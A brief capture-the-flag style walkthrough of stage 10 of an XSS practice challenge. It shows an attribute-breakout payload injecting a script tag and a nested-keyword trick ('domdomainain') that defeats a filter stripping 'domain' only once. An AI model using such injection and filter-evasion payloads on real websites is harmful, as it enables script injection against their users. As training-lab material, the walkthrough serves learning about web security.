# **XSS Challenges Stage 10**

Insert Stage 2 payload again.

`"><script>alert(document.domain);</script><a style="`

Then you will see this in source code.

```
<hr class=red>No results for your Query. Try again: <input type="text" name="p1" size="50" value=""><script>alert(document.);</script><a style=""> 
```

The code `domain` is miss. It means the whole word has been replaced.

Here's come up a common trick. This trick can pass the replaceing technism which just check for once.

Use the word which will be replaced to seperate the word itself.

Like `domain` becomes `domdomainain`.

Let's insert our new payload:

`"><script>alert(document.domdomainain);</script><a style="`

![](https://i.imgur.com/GDn9607.png)

